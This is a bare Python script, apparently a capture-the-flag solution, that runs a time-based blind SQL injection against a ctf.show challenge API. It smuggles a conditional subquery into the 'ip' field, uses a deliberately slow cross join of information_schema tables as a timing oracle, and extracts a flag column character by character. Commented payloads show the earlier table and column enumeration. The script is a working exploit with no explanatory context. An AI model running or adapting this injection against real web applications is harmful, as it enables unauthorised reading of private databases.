import time

import requests

url = "http://acf6340e-22ce-49a3-b3e6-69dfabe9ba58.challenge.ctf.show/api/"

strr = "_1234567890{}-qazwsxedcrfvtgbyhnujmikolp"
# payload = "select table_name from information_schema.tables where table_schema=database() limit 0,1"
# payload = "select column_name from information_schema.columns where table_name='ctfshow_flagxcac' limit 1,1"
payload = "select flagaabcc from ctfshow_flagxcac"
cnt = 1
res = ""
while True:
    print(cnt)
    for i in strr:
        res += i
        data = {
            'ip': f"1) or if(left(({payload}),{cnt})='{res}',(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H),1",
            'debug': '1'
        }
        # print(i)
        try:
            r = requests.post(url, data=data, timeout=0.5)
            res = res[:-1]
        except Exception as e:
            print('[*]' + res)
            cnt += 1
            time.sleep(3)
            break
